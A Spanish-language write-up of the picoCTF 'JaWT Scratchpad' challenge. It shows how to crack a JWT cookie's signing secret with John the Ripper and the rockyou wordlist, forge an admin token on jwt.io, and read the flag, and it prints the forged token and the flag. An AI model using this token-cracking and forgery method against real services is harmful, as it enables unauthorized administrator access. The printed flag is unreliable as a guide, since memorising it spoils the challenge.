## Reto:  JaWT Scratchpad
### Descripción
¡Comprueba el scratchpad de administrador! `https://jupiter.challenges.picoctf.org/problem/61864/` o http://jupiter.challenges.picoctf.org:61864
### Solución
Primero abrimos la pagina que nos proporciona `PicoCTF`
Vemos que podemos registrarnos con cualquier nombre, menos el de `admin`, esto por que la contraseña que esta acorde con el nombre de usuario registrado para administrador no esta ligado con la que tenemos actualmente.
- Primero nos logueamos con cualquier nombre para generar la `cookie`
- Copiamos la `cookie` generada
- Entramos a nuestra terminal de `Kali`
- Ingresamos a la siguiente dirección
```shell
cd /usr/share/wordlists/
```
En esta dirección encontramos el archivo `rockdeyou.txt.gz` que nos servirá para encontrar la contraseña de la `cookie` de `admin`.
- Descomprimimos el archivo con el siguiente comando:
```shell
gzip -d rockyou.txt.gz
```
- Ahora creamos el archivo donde se almacenara la cookie:
```shell
nano eltoken
```
Abrirá un documento editable, en el cual pegaremos la cookie, guardaremos con `ctrl + o` y saldremos con `ctrl + x`.
- Ahora el siguiente comando nos dará la contraseña ligada al `username` de la `cookie`:
```shell
john eltoken -w=/usr/share/wordlists/rockyou.txt
```
Y nos da la contraseña ligada:
```cookie
ilovepico
```
Entramos a la siguiente direccion
```http
https://jwt.io/
```
Ahora en esa pagina editamos el username de nuestro nombre por el de admin:
```http
{
  "user": "admin"
}
```
Y pegamos la contraseña por `ilovepico`
Volvemos a la pagina del ejercicio y en la cookie pegamos la cookie que nos dio en el jwt.
```c
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```
Ahora recargamos la pagina y esto nos regresara la cookie:
```flag
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```


### Notas adicionales
### Referencias

